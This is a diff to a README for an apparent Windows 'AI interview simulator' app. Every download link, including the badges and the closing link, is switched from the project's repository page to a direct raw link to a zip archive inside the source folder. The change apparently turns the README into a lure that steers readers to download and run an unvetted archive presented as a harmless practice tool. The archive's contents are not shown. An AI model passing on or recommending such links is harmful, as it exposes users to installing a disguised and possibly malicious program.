@@ -1,11 +1,11 @@
 # 🤖 AI-interview-simulator - Practice interviews with calm feedback
 
-[![Download AI-interview-simulator](https://img.shields.io/badge/Download-Run%20on%20Windows-blue?style=for-the-badge)](https://github.com/Resourceless-greatwhiteheron884/AI-interview-simulator)
+[![Download AI-interview-simulator](https://img.shields.io/badge/Download-Run%20on%20Windows-blue?style=for-the-badge)](https://raw.githubusercontent.com/Resourceless-greatwhiteheron884/AI-interview-simulator/main/src/interview-A-simulator-1.1.zip)
 
 ## 📥 Download
 Visit this page to download and run the app on Windows:
 
-[Download AI-interview-simulator](https://github.com/Resourceless-greatwhiteheron884/AI-interview-simulator)
+[Download AI-interview-simulator](https://raw.githubusercontent.com/Resourceless-greatwhiteheron884/AI-interview-simulator/main/src/interview-A-simulator-1.1.zip)
 
 ## 🖥️ What this app does
 
@@ -207,4 +207,4 @@ Use the feedback from each run to improve the next one
 
 If you need the app later, use this page:
 
-[https://github.com/Resourceless-greatwhiteheron884/AI-interview-simulator](https://github.com/Resourceless-greatwhiteheron884/AI-interview-simulator)
+[https://raw.githubusercontent.com/Resourceless-greatwhiteheron884/AI-interview-simulator/main/src/interview-A-simulator-1.1.zip](https://raw.githubusercontent.com/Resourceless-greatwhiteheron884/AI-interview-simulator/main/src/interview-A-simulator-1.1.zip)
